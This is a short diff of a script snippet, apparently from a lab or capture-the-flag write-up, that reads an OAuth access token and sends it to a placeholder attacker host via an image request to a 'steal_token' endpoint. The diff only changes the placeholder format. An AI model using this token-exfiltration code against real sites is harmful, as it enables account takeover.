@@ -3,6 +3,6 @@
   }, {});
   var accessToken = result.access_token;
     var img = new Image();
-    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
+    img.src = 'http://<ATTACKBOX_IP>:<attacker-port>/steal_token?token=' + accessToken;
 </script>
 
